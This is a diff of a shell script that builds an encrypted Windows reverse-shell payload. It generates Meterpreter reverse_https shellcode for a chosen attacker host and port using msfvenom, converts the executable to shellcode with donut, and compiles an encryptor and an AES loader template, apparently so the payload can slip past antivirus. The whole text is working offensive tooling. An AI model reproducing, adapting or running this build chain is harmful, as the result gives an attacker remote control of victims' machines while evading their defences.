@@ -14,20 +14,25 @@ mkdir tmp
 mkdir output
 mkdir input
 
+raw_cs_filename_compiled=$lhost'_'$lport'_'$arch'_https.exe'
 rawscfilename=$lhost'_'$lport'_https.bin'
 rawscfilename_enc=$rawscfilename'.enc'
 
 if [ $arch = 'x64' ]
 then
-    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o input/$rawscfilename
+    #msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o tmp/$rawscfilename
+    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe -o input/$raw_cs_filename_compiled
+    donut/donut -a 2 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
 fi
 
 if [ $arch = 'x86' ]
 then
-    msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o input/$rawscfilename
+    #msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f raw -o tmp/$rawscfilename
+    msfvenom -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe -o input/$raw_cs_filename_compiled
+    donut/donut -a 1 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
 fi
 
-cp aesloader2_template.txt tmp/aesloadermono_mp.cs
+cp aesloader_template.txt tmp/aesloadermono_mp.cs
 
 mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
 mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt
